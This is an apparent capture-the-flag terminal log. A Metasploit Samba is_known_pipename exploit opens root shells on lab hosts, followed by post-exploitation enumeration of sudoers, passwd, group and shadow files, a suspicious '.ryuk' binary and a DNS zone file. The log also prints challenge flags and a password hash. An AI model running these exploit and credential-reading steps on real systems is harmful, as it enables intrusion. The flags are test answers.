/usr/share/doc/git/contrib/examples/git-ls-remote.sh
/usr/share/doc/git/contrib/examples/git-notes.sh
/usr/share/doc/python-serial/examples/port_publisher.sh
/usr/share/doc/w3m/examples/Bonus/oldconfigure.sh
/usr/share/doc/acpid/examples/default.sh
/usr/share/doc/acpid/examples/ac.sh
/usr/share/doc/gawk/examples/prog/igawk.sh
/usr/share/doc/gawk/examples/network/PostAgent.sh
/usr/share/doc/popularity-contest/examples/popcon-process.sh
/usr/share/doc/ifupdown/examples/ping-places.sh
/usr/share/doc/ifupdown/examples/check-mac-address.sh
/usr/share/doc/ifupdown/examples/get-mac-address.sh
/usr/share/doc/ifupdown/examples/pcmcia-compat.sh
/usr/share/doc/netcat-openbsd/examples/dist.sh
/usr/share/doc/tmux/examples/bash_completion_tmux.sh
/usr/share/doc/tmux/examples/tmux_backup.sh
/usr/share/doc/cron/examples/cron-tasks-review.sh
/etc/profile.d/Z97-byobu.sh
/etc/profile.d/bash_completion.sh
/etc/acpi/powerbtn.sh
/etc/init.d/umountnfs.sh
/etc/wpa_supplicant/ifupdown.sh
/etc/wpa_supplicant/action_wpa.sh
/etc/wpa_supplicant/functions.sh
/boot/grub/i386-pc/modinfo.sh
/var/www_sub/admin/.init-token.php
/lib/recovery-mode/l10n.sh
/lib/ifupdown/settle-dad.sh
/lib/firmware/carl9170fw/autogen.sh
/lib/firmware/carl9170fw/genapi.sh
/lib/init/vars.sh
netstat -tulnp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1049/lighttpd   
tcp        0      0 10.10.33.174:53         0.0.0.0:*               LISTEN      977/named       
tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      977/named       
tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN      977/named       
tcp        0      0 0.0.0.0:44544           0.0.0.0:*               LISTEN      1363/smbd       
tcp        0      0 0.0.0.0:1986            0.0.0.0:*               LISTEN      861/sshd        
tcp6       0      0 :::53                   :::*                    LISTEN      977/named       
tcp6       0      0 ::1:953                 :::*                    LISTEN      977/named       
tcp6       0      0 :::44544                :::*                    LISTEN      1363/smbd       
tcp6       0      0 :::1986                 :::*                    LISTEN      861/sshd        
udp        0      0 0.0.0.0:63377           0.0.0.0:*                           609/dhclient    
udp        0      0 10.10.33.174:53         0.0.0.0:*                           977/named       
udp        0      0 127.0.0.1:53            0.0.0.0:*                           977/named       
udp        0      0 0.0.0.0:68              0.0.0.0:*                           609/dhclient    
udp        0      0 10.10.255.255:137       0.0.0.0:*                           1365/nmbd       
udp        0      0 10.10.33.174:137        0.0.0.0:*                           1365/nmbd       
udp        0      0 0.0.0.0:137             0.0.0.0:*                           1365/nmbd       
udp        0      0 10.10.255.255:138       0.0.0.0:*                           1365/nmbd       
udp        0      0 10.10.33.174:138        0.0.0.0:*                           1365/nmbd       
udp        0      0 0.0.0.0:138             0.0.0.0:*                           1365/nmbd       
udp6       0      0 :::54021                :::*                                609/dhclient    
udp6       0      0 :::53                   :::*                                977/named       
ls -la /tmp /var/tmp /dev/shm /opt /root /home 2>/dev/null
lrwxrwxrwx 1 root root    8 Apr 13 22:05 /dev/shm -> /run/shm

/home:
total 24
drwxr-xr-x  4 root      root      4096 Apr  9 15:55 .
drwxr-xr-x 22 root      root      4096 Apr  8 23:51 ..
-rwxr-xr-x  1 root      root      6352 Nov  3 14:27 .ryuk
drwxr-x---  4 bluffer   bluffer   4096 Apr  9 15:27 bluffer
drwxr-xr-x  3 guakamole guakamole 4096 Apr  9 15:40 guakamole

/opt:
total 8
drwxr-xr-x  2 root root 4096 Mar  5  2019 .
drwxr-xr-x 22 root root 4096 Apr  8 23:51 ..

/root:
total 36
drwx------  4 root root 4096 Apr  9 15:24 .
drwxr-xr-x 22 root root 4096 Apr  8 23:51 ..
lrwxrwxrwx  1 root root    9 Nov  3 12:56 .bash_history -> /dev/null
-rw-r--r--  1 root root 3744 Apr  9 17:08 .bashrc
drwx------  3 root root 4096 Apr  8 23:02 .cache
drwxr-xr-x  2 root root 4096 Apr  8 22:53 .pip
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-------  1 root root 1024 Apr  5 13:13 .rnd
----------  1 root root   23 Nov  3 13:41 .s3cr3t
-rw-------  1 root root  629 Nov  3 14:10 .viminfo

/tmp:
total 16
drwxrwxrwt  4 root root 4096 Apr 13 23:17 .
drwxr-xr-x 22 root root 4096 Apr  8 23:51 ..
drwxrwxrwt  2 root root 4096 Apr 13 22:05 .ICE-unix
drwxrwxrwt  2 root root 4096 Apr 13 22:05 .X11-unix

/var/tmp:
total 8
drwxrwxrwt  2 root root 4096 Oct 18 17:28 .
drwxr-xr-x 15 root root 4096 Apr  5 22:45 ..
sudo cat /root/.s3cr3t
GFCS|C0d3-S3cr3t-R00t|
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
landscape:x:103:109::/var/lib/landscape:/bin/false
guakamole:x:1000:1000:David Kline,,,:/home/guakamole:/bin/bash
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
bind:x:105:112::/var/cache/bind:/bin/false
bluffer:x:1001:1001:Player Bluffer,,,:/home/bluffer:/bin/rbash
find /home /tmp /var/tmp /opt /dev/shm -type f -executable -ls 2>/dev/null
274975    4 -rwxr-xr-x   1 root     root           31 Apr  8 11:40 /home/bluffer/cmds/touch
274967    4 -rwxr-xr-x   1 root     root           31 Apr  8 11:34 /home/bluffer/cmds/pwd
274952    4 -rwxr-xr-x   1 bluffer  bluffer        66 Apr  8 13:14 /home/bluffer/cmds/OPEN_SMB
274970    4 -rwxr-xr-x   1 root     root           16 Apr  8 11:57 /home/bluffer/cmds/clear
275182   20 -rwxr-xr-x   1 root     root        18999 Apr  9 15:10 /home/bluffer/cmds/bluffer
262136    4 -rwxr-xr-x   1 root     root           31 Apr  8 13:33 /home/bluffer/cmds/uname
274904    4 -rwxr-xr-x   1 root     root           53 Apr  9 15:23 /home/bluffer/cmds/START_BLUFFER
274974    4 -rwxr-xr-x   1 root     root           31 Apr  8 11:40 /home/bluffer/cmds/mv
274963    4 -rwxr-xr-x   1 root     root           31 Apr  8 11:34 /home/bluffer/cmds/grep
274968    4 -rwxr-xr-x   1 root     root           31 Apr  8 11:36 /home/bluffer/cmds/whoami
274972    4 -rwxr-xr-x   1 root     root           31 Apr  8 11:39 /home/bluffer/cmds/chmod
274978    4 -rwxr-xr-x   1 root     root           31 Apr  8 11:40 /home/bluffer/cmds/cd
274983    4 -rwxr-xr-x   1 root     root           31 Apr  8 12:11 /home/bluffer/cmds/exit
274982    4 -rwxr-xr-x   1 root     root           31 Apr  8 12:00 /home/bluffer/cmds/man
274965    4 -rwxr-xr-x   1 root     root           31 Apr  8 11:34 /home/bluffer/cmds/more
274966    4 -rwxr-xr-x   1 root     root           31 Apr  8 13:20 /home/bluffer/cmds/sudo
274969    4 -rwxr-xr-x   1 root     root           31 Apr  8 11:38 /home/bluffer/cmds/la
274976    4 -rwxr-xr-x   1 root     root           31 Apr  8 11:40 /home/bluffer/cmds/cp
274962    4 -rwxr-xr-x   1 root     root           31 Apr  8 11:34 /home/bluffer/cmds/cat
274964    4 -rwxr-xr-x   1 root     root           31 Apr  8 11:34 /home/bluffer/cmds/echo
274973    4 -rwxr-xr-x   1 root     root           31 Apr  8 11:39 /home/bluffer/cmds/chown
274971    4 -rwxr-xr-x   1 root     root           31 Apr  8 11:39 /home/bluffer/cmds/top
274979    4 -rwxr-xr-x   1 root     root           31 Apr  8 11:41 /home/bluffer/cmds/tee
274977    4 -rwxr-xr-x   1 root     root           31 Apr  8 11:40 /home/bluffer/cmds/rm
274961    4 -rwxr-xr-x   1 root     root           31 Apr  8 11:34 /home/bluffer/cmds/ls
152613    8 -rwxr-xr-x   1 root     root         6352 Nov  3 14:27 /home/.ryuk

compgen -u | wc -l
/bin/sh: 43: compgen: not found
0
cut -d: -f1 /etc/passwd | wc -l
26
cut -d: -f1 /etc/passwd
root
daemon
bin
sys
sync
games
man
lp
mail
news
uucp
proxy
www-data
backup
list
irc
gnats
nobody
libuuid
syslog
messagebus
landscape
guakamole
sshd
bind
bluffer
cat /etc/passwd | grep guakamole
guakamole:x:1000:1000:David Kline,,,:/home/guakamole:/bin/bash

grep -r "David Kline" /home/

grep guakamole /var/log/auth.log

grep guakamole /var/log/sudo.log
grep: /var/log/sudo.log: No such file or directory
cat /etc/group | grep guakamole
adm:x:4:syslog,guakamole
cdrom:x:24:guakamole
sudo:x:27:guakamole
dip:x:30:guakamole
plugdev:x:46:guakamole
guakamole:x:1000:
lpadmin:x:110:guakamole
sambashare:x:111:guakamole
cat /home/guakamole/.bash_history

grep "David Kline" /var/mail/*
grep: /var/mail/*: No such file or directory

ls -la /home/guakamole/
total 28
drwxr-xr-x 3 guakamole guakamole 4096 Apr  9 15:40 .
drwxr-xr-x 4 root      root      4096 Apr  9 15:55 ..
lrwxrwxrwx 1 guakamole guakamole    9 Nov  3 13:06 .bash_history -> /dev/null
-rw-r--r-- 1 guakamole guakamole  220 Oct 18 17:29 .bash_logout
-rw-r--r-- 1 guakamole guakamole 3738 Apr  9 17:07 .bashrc
drwx------ 2 guakamole guakamole 4096 Oct 18 17:29 .cache
-rw-r--r-- 1 guakamole guakamole  675 Oct 18 17:29 .profile
-rw-r--r-- 1 root      root        19 Apr  9 16:59 warning.txt

sudo grep guakamole /var/log/auth.log*

sudo visudo
Error opening terminal: unknown.
visudo: /etc/sudoers.tmp unchanged
grep "sudo" /home/guakamole/.bash_history

sudo cat /home/guakamole/warning.txt
Cuidado con "ryuk"

sudo cat /etc/sudoers
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d

# BLUFFER
bluffer ALL=(ALL) NOPASSWD: /usr/local/bin/OPEN_SMB
bluffer ALL=(ALL) NOPASSWD: /etc/init.d/samba start

# WWW-DATA : SIEM
www-data ALL=(ALL) NOPASSWD: /usr/bin/killall, /usr/sbin/lighttpd


grep -i "ryuk" -r /home/
Binary file /home/bluffer/cmds/bluffer matches
/home/guakamole/.bashrc:alias RYUK='/home/.ryuk'
/home/guakamole/warning.txt:Cuidado con "ryuk"

sudo:x:27:guakamole
/bin/sh: 69: sudo:x:27:guakamole: not found

bluffer ALL=(ALL) NOPASSWD: /usr/local/bin/OPEN_SMB
/bin/sh: 5: Syntax error: "(" unexpected
[*] 10.10.33.174 - Command shell session 3 closed.
msf6 exploit(linux/samba/is_known_pipename) > exploit
[*] 10.10.33.174:44544 - Using location \\10.10.33.174\nebula_share\ for the path
[*] 10.10.33.174:44544 - Retrieving the remote path of the share 'nebula_share'
[*] 10.10.33.174:44544 - Share 'nebula_share' has server-side path '/srv/samba/share
[*] 10.10.33.174:44544 - Uploaded payload to \\10.10.33.174\nebula_share\HgCDpdsF.so
[*] 10.10.33.174:44544 - Loading the payload from server-side path /srv/samba/share/HgCDpdsF.so using \\PIPE\/srv/samba/share/HgCDpdsF.so...
[-] 10.10.33.174:44544 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] 10.10.33.174:44544 - Loading the payload from server-side path /srv/samba/share/HgCDpdsF.so using /srv/samba/share/HgCDpdsF.so...
[+] 10.10.33.174:44544 - Probe response indicates the interactive payload was loaded...
[*] Found shell.
[*] Command shell session 4 opened (10.8.105.111:46225 -> 10.10.33.174:44544) at 2025-04-13 18:54:48 -0400

ls -l /usr/local/bin/OPEN_SMB
-rwxr-xr-x 1 root root 43 Apr  8 12:27 /usr/local/bin/OPEN_SMB

cat /usr/local/bin/OPEN_SMB
#!/bin/bash
/usr/local/samba/sbin/smbd -D

zsh: corrupt history file /home/kali/.zsh_history
┌──(kali㉿kali)-[~]
└─$ msfconsole

Metasploit tip: You can pivot connections over sessions started with the 
ssh_login modules
                                                  

Unable to handle kernel NULL pointer dereference at virtual address 0xd34db33f
EFLAGS: 00010046
eax: 00000001 ebx: f77c8c00 ecx: 00000000 edx: f77f0001
esi: 803bf014 edi: 8023c755 ebp: 80237f84 esp: 80237f60
ds: 0018   es: 0018  ss: 0018
Process Swapper (Pid: 0, process nr: 0, stackpage=80377000)


Stack: 90909090990909090990909090
       90909090990909090990909090
       90909090.90909090.90909090
       90909090.90909090.90909090
       90909090.90909090.09090900
       90909090.90909090.09090900
       ..........................
       cccccccccccccccccccccccccc
       cccccccccccccccccccccccccc
       ccccccccc.................
       cccccccccccccccccccccccccc
       cccccccccccccccccccccccccc
       .................ccccccccc
       cccccccccccccccccccccccccc                             
       cccccccccccccccccccccccccc                             
       ..........................                             
       ffffffffffffffffffffffffff                             
       ffffffff..................                             
       ffffffffffffffffffffffffff                             
       ffffffff..................                             
       ffffffff..................                             
       ffffffff..................                             
                                                              

Code: 00 00 00 00 M3 T4 SP L0 1T FR 4M 3W OR K! V3 R5 I0 N5 00 00 00 00                                                     
Aiee, Killing Interrupt handler
Kernel panic: Attempted to kill the idle task!
In swapper task - not syncing                                 


       =[ metasploit v6.4.50-dev                          ]
+ -- --=[ 2496 exploits - 1283 auxiliary - 431 post       ]
+ -- --=[ 1610 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

[*] Starting persistent handler(s)...
msf6 > use exploit/linux/samba/is_known_pipename
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(linux/samba/is_known_pipename) > set RHOSTS 10.10.30.139
RHOSTS => 10.10.30.139
msf6 exploit(linux/samba/is_known_pipename) > set RPORT 44544
RPORT => 44544
msf6 exploit(linux/samba/is_known_pipename) > show options

Module options (exploit/linux/samba/is_known_pipename):

   Name          Current Setti  Required  Description
                 ng
   ----          -------------  --------  -----------
   CHOST                        no        The local client a
                                          ddress
   CPORT                        no        The local client p
                                          ort
   Proxies                      no        A proxy chain of f
                                          ormat type:host:po
                                          rt[,type:host:port
                                          ][...]
   RHOSTS        10.10.30.139   yes       The target host(s)
                                          , see https://docs
                                          .metasploit.com/do
                                          cs/using-metasploi
                                          t/basics/using-met
                                          asploit.html
   RPORT         44544          yes       The SMB service po
                                          rt (TCP)
   SMB_FOLDER                   no        The directory to u
                                          se within the writ
                                          eable SMB share
   SMB_SHARE_NA                 no        The name of the SM
   ME                                     B share containing
                                           a writeable direc
                                          tory


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Interact)



View the full module info with the info, or info -d command.

msf6 exploit(linux/samba/is_known_pipename) > exploit
[-] 10.10.30.139:44544 - No suitable share and path were found, try setting SMB_SHARE_NAME and SMB_FOLDER
[-] 10.10.30.139:44544 - Exploit aborted due to failure: no-target: No matching target
[*] Exploit completed, but no session was created.
msf6 exploit(linux/samba/is_known_pipename) > set RPORT 44544
RPORT => 44544
msf6 exploit(linux/samba/is_known_pipename) > exploit
^C[-] 10.10.30.139:44544 - Exploit failed [user-interrupt]: Interrupt 
[-] exploit: Interrupted
msf6 exploit(linux/samba/is_known_pipename) > show optiones
[-] Invalid parameter "optiones", use "show -h" for more information
msf6 exploit(linux/samba/is_known_pipename) > show options

Module options (exploit/linux/samba/is_known_pipename):

   Name          Current Setti  Required  Description
                 ng
   ----          -------------  --------  -----------
   CHOST                        no        The local client a
                                          ddress
   CPORT                        no        The local client p
                                          ort
   Proxies                      no        A proxy chain of f
                                          ormat type:host:po
                                          rt[,type:host:port
                                          ][...]
   RHOSTS        10.10.30.139   yes       The target host(s)
                                          , see https://docs
                                          .metasploit.com/do
                                          cs/using-metasploi
                                          t/basics/using-met
                                          asploit.html
   RPORT         44544          yes       The SMB service po
                                          rt (TCP)
   SMB_FOLDER                   no        The directory to u
                                          se within the writ
                                          eable SMB share
   SMB_SHARE_NA                 no        The name of the SM
   ME                                     B share containing
                                           a writeable direc
                                          tory


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Interact)



View the full module info with the info, or info -d command.

msf6 exploit(linux/samba/is_known_pipename) > run
[*] 10.10.30.139:44544 - Using location \\10.10.30.139\nebula_share\ for the path
[*] 10.10.30.139:44544 - Retrieving the remote path of the share 'nebula_share'
[*] 10.10.30.139:44544 - Share 'nebula_share' has server-side path '/srv/samba/share
[*] 10.10.30.139:44544 - Uploaded payload to \\10.10.30.139\nebula_share\PKyVLpQh.so
[*] 10.10.30.139:44544 - Loading the payload from server-side path /srv/samba/share/PKyVLpQh.so using \\PIPE\/srv/samba/share/PKyVLpQh.so...
[-] 10.10.30.139:44544 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] 10.10.30.139:44544 - Loading the payload from server-side path /srv/samba/share/PKyVLpQh.so using /srv/samba/share/PKyVLpQh.so...
[+] 10.10.30.139:44544 - Probe response indicates the interactive payload was loaded...
[*] Found shell.
[*] Command shell session 1 opened (10.8.105.111:40099 -> 10.10.30.139:44544) at 2025-04-14 04:29:01 -0400

whoami
root

do_connect: Connection to 10.10.30.139 failed (Error NT_STATUS                         
/bin/sh: 7: do_connect:: not found
cat /etc/samba/smb.conf | grep -i workgroup
cat: /etc/samba/smb.conf: No such file or directory
sudo smbclient -L //127.0.0.1/ -N
sudo: smbclient: command not found
smbclient -L 127.0.0.1 -N
/bin/sh: 10: smbclient: not found
nmap -sV -p 139 10.10.30.139
/bin/sh: 11: nmap: not found
nmblookup -A 127.0.0.1
/bin/sh: 12: nmblookup: not found

grep -Ri "guest" /etc/samba/ 2>/dev/null

find / -type f -iname "*guest*" 2>/dev/null

/usr/src/linux-headers-4.4.0-142-generic/include/config/kvm/guest.h
/usr/src/linux-headers-4.4.0-142-generic/include/config/hypervisor/guest.h
/usr/src/linux-headers-4.4.0-142/include/linux/lguest.h
/usr/src/linux-headers-4.4.0-142/include/linux/lguest_launcher.h
/usr/src/linux-headers-4.4.0-142/arch/x86/include/asm/lguest.h
/usr/src/linux-headers-4.4.0-142/arch/x86/include/asm/lguest_hcall.h
/usr/src/linux-headers-4.4.0-142/arch/x86/include/asm/kvm_guest.h

grep -Ri "guest" /home/ /root/ /var/ 2>/dev/null

find / -type f -iname "*.txt" 2>/dev/null | grep -i guest

grep -Ri "guest" /home /root /etc /var 2>/dev/null | less

grep -i "guest" $(find / -type f -iname "*.txt" 2>/dev/null) 2>/dev/null

find / -type f \( -iname "*welcome*" -o -iname "*login*" -o -iname "*guest*" \) 2>/dev/null

grep -Ri "ryuk" /home /root /var /etc 2>/dev/null

cat /etc/group

cat /etc/group | wc -l

groups
groups guest
getent group
ls -l /home

whoami
^C
Abort session 1? [y/N]  background
[*] Aborting foreground process in the shell session
sessions
[*] Wrong number of arguments expected: 1, received: 0
Usage: sessions <id>

Interact with a different session Id.
This command only accepts one positive numeric argument.
This works the same as calling this from the MSF shell: sessions -i <session id>

sessions -l
[*] Invalid session id
Usage: sessions <id>

Interact with a different session Id.
This command only accepts one positive numeric argument.
This works the same as calling this from the MSF shell: sessions -i <session id>

sessions -l
[*] Invalid session id
Usage: sessions <id>

Interact with a different session Id.
This command only accepts one positive numeric argument.
This works the same as calling this from the MSF shell: sessions -i <session id>

sessions -1
[*] Invalid session id
Usage: sessions <id>

Interact with a different session Id.
This command only accepts one positive numeric argument.
This works the same as calling this from the MSF shell: sessions -i <session id>

whoami
sessions -l
[*] Invalid session id
Usage: sessions <id>

Interact with a different session Id.
This command only accepts one positive numeric argument.
This works the same as calling this from the MSF shell: sessions -i <session id>

background

Background session 1? [y/N]  y
msf6 exploit(linux/samba/is_known_pipename) > run
[*] 10.10.30.139:44544 - Using location \\10.10.30.139\nebula_share\ for the path
[*] 10.10.30.139:44544 - Retrieving the remote path of the share 'nebula_share'
[*] 10.10.30.139:44544 - Share 'nebula_share' has server-side path '/srv/samba/share
[*] 10.10.30.139:44544 - Uploaded payload to \\10.10.30.139\nebula_share\iqYaRLdo.so
[*] 10.10.30.139:44544 - Loading the payload from server-side path /srv/samba/share/iqYaRLdo.so using \\PIPE\/srv/samba/share/iqYaRLdo.so...
[-] 10.10.30.139:44544 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] 10.10.30.139:44544 - Loading the payload from server-side path /srv/samba/share/iqYaRLdo.so using /srv/samba/share/iqYaRLdo.so...
[+] 10.10.30.139:44544 - Probe response indicates the interactive payload was loaded...
[*] Found shell.
[*] Command shell session 2 opened (10.8.105.111:44989 -> 10.10.30.139:44544) at 2025-04-14 05:00:44 -0400

whoami
root
groups
root
       
ls -l /home
total 8
drwxr-x--- 4 bluffer   bluffer   4096 Apr  9 15:27 bluffer
drwxr-xr-x 3 guakamole guakamole 4096 Apr  9 15:40 guakamole

cat /etc/group
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog,guakamole
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:guakamole
floppy:x:25:
tape:x:26:
sudo:x:27:guakamole
audio:x:29:
dip:x:30:guakamole
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:guakamole
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
libuuid:x:101:
netdev:x:102:
crontab:x:103:
syslog:x:104:
fuse:x:105:
messagebus:x:106:
mlocate:x:107:
ssh:x:108:
landscape:x:109:
guakamole:x:1000:
lpadmin:x:110:guakamole
sambashare:x:111:guakamole
bind:x:112:
bluffer:x:1001:

grep -Ri "bluffer" /etc/
grep -Ri "ryuk" /etc/
/etc/passwd:bluffer:x:1001:1001:Player Bluffer,,,:/home/bluffer:/bin/rbash
grep: /etc/rc0.d/K20netcat_port53: No such file or directory
/etc/bind/db.nebula.io:bluffer               7200    IN      TXT     "BLUFFER{S3cr3t_DNS_Tr4nsfer_Flag}"
/etc/bind/db.nebula.io:xss                   300     IN      TXT     "user : bluffer"
/etc/shadow:bluffer:$6$XDj2Khlp$3O50apIJ/1wbvCbfCRFWQsyVgp3BXTB.sQfQLGvIfpLHAulDOFXADfugbba8uPFc93CVUZTTBGZvdvOIl7mWc/:20186:0:99999:7:::
grep: /etc/blkid.tab: No such file or directory
/etc/sudoers:# BLUFFER
/etc/sudoers:bluffer ALL=(ALL) NOPASSWD: /usr/local/bin/OPEN_SMB
/etc/sudoers:bluffer ALL=(ALL) NOPASSWD: /etc/init.d/samba start
/etc/passwd-:bluffer:x:1001:1001::/home/bluffer:/bin/bash
/etc/gshadow:bluffer:!::
grep: /etc/rc3.d/S20netcat_port53: No such file or directory
grep: /etc/rc4.d/S20netcat_port53: No such file or directory
grep: /etc/rc1.d/K20netcat_port53: No such file or directory
/etc/subuid:bluffer:165536:65536
/etc/group:bluffer:x:1001:
/etc/subgid:bluffer:165536:65536
grep: /etc/rc5.d/S20netcat_port53: No such file or directory
grep: /etc/rc2.d/S20netcat_port53: No such file or directory
grep: /etc/rc6.d/K20netcat_port53: No such file or directory
grep: /etc/rc0.d/K20netcat_port53: No such file or directory
grep: /etc/blkid.tab: No such file or directory
grep: /etc/rc3.d/S20netcat_port53: No such file or directory
grep: /etc/rc4.d/S20netcat_port53: No such file or directory
grep: /etc/rc1.d/K20netcat_port53: No such file or directory
grep: /etc/rc5.d/S20netcat_port53: No such file or directory
grep: /etc/rc2.d/S20netcat_port53: No such file or directory
grep: /etc/rc6.d/K20netcat_port53: No such file or directory

cat /usr/local/bin/OPEN_SMB
#!/bin/bash
/usr/local/samba/sbin/smbd -D

systemctl status samba
cat /etc/samba/smb.conf
/bin/sh: 16: systemctl: not found
cat: /etc/samba/smb.conf: No such file or directory

cat /etc/bind/db.nebula.io
$TTL    86400
@       IN      SOA     ns1.nebula.io. admin.nebula.io. (
                          2023102501         ; Serial
                          604800             ; Refresh
                          86400              ; Retry
                          2419200            ; Expire
                          604800 )           ; Negative Cache TTL

@       IN      NS      ns1.nebula.io.
@       IN      NS      ns2.nebula.io.
ns1     IN      A       192.168.150.144
ns2     IN      A       192.168.150.145

nebula.io.            7200    IN      A       192.168.150.144
www                   7200    IN      A       192.168.150.144
ftp                   7200    IN      A       192.168.150.180

nebula.io.            300     IN      HINFO   "Nebula Server" "Linux"

nebula.io.            301     IN      TXT     "nebula-verification=examplecode123"
nebula.io.            301     IN      TXT     "google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA"

nebula.io.            7200    IN      MX      0 mail.nebula.io.
nebula.io.            7200    IN      MX      0 ASPMX.L.GOOGLE.COM.
nebula.io.            7200    IN      MX      10 ALT1.ASPMX.L.GOOGLE.COM.
nebula.io.            7200    IN      MX      10 ALT2.ASPMX.L.GOOGLE.COM.
nebula.io.            7200    IN      MX      20 ASPMX2.GOOGLEMAIL.COM.
nebula.io.            7200    IN      MX      20 ASPMX3.GOOGLEMAIL.COM.
nebula.io.            7200    IN      MX      20 ASPMX4.GOOGLEMAIL.COM.
nebula.io.            7200    IN      MX      20 ASPMX5.GOOGLEMAIL.COM.
mail                  7200    IN      A       192.168.150.146

_sip._tcp.nebula.io.  14000   IN      SRV     0 5 5060 sip.nebula.io.
sip                   7200    IN      A       192.168.150.147

144.150.168.192.IN-ADDR.ARPA.nebula.io. 7200 IN PTR www.nebula.io.

bluffer               7200    IN      TXT     "BLUFFER{S3cr3t_DNS_Tr4nsfer_Flag}"

contact               2592000 IN      TXT     "Para soporte, contactar a admin@nebula.io o llamar al +1 123 4567890"

office                7200    IN      A       192.0.2.10
vpn                   7200    IN      A       198.51.100.10
xss                   300     IN      TXT     "user : bluffer"
deadbeef              7201    IN      AAAA    dead:beef::1

nebula.io.            7200    IN      SOA     ns1.nebula.io. admin.nebula.io. 2023102501 604800 86400 2419200 604800

ls -la /home/bluffer
total 24
drwxr-x--- 4 bluffer bluffer 4096 Apr  9 15:27 .
drwxr-xr-x 4 root    root    4096 Apr  9 15:55 ..
---------- 1 bluffer bluffer    0 Apr  8 10:52 .bash_history
-rw-r--r-- 1 bluffer bluffer    0 Apr  8 12:19 .bash_logout
-rw-r--r-- 1 bluffer bluffer 2772 Apr  9 17:06 .bashrc
drwx------ 2 bluffer bluffer 4096 Apr  8 10:53 .cache
-rw-r--r-- 1 bluffer bluffer    0 Apr  8 11:19 .hushlogin
-rw-r--r-- 1 bluffer bluffer   80 Apr  8 13:25 .profile
drwxr-xr-x 2 root    root    4096 Apr  9 15:17 cmds

ps aux | grep smbd
root      1290  0.0  1.4 312008 15168 ?        Ss   09:55   0:00 /usr/local/samba/sbin/smbd -D
root      1292  0.0  0.4 303928  4420 ?        S    09:55   0:00 /usr/local/samba/sbin/smbd -D
root      1293  0.0  0.4 303944  4424 ?        S    09:55   0:00 /usr/local/samba/sbin/smbd -D
root      1296  0.0  0.4 311992  4432 ?        S    09:55   0:00 /usr/local/samba/sbin/smbd -D
root      1392  0.0  0.0   8884   880 ?        S    11:09   0:00 grep smbd

ls -la /etc/samba/
ls -la /usr/local/samba/
ls: cannot access /etc/samba/: No such file or directory
total 40
drwxr-xr-x 10 root root 4096 Oct 25 18:31 .
drwxr-xr-x 11 root root 4096 Oct 25 18:31 ..
drwxr-xr-x  2 root root 4096 Oct 25 18:33 bin
drwxr-xr-x  2 root root 4096 Oct 25 18:43 etc
drwxr-xr-x  7 root root 4096 Oct 25 18:31 include
drwxr-xr-x 14 root root 4096 Oct 25 18:33 lib
drwxr-xr-x  3 root root 4096 Oct 26 09:07 private
drwxr-xr-x  2 root root 4096 Oct 25 18:33 sbin
drwxr-xr-x  5 root root 4096 Oct 25 18:33 share
drwxr-xr-x  8 root root 4096 Oct 25 18:44 var


ls -la /home/bluffer/cmds
total 124
drwxr-xr-x 2 root    root     4096 Apr  9 15:17 .
drwxr-x--- 4 bluffer bluffer  4096 Apr  9 15:27 ..
-rwxr-xr-x 1 bluffer bluffer    66 Apr  8 13:14 OPEN_SMB
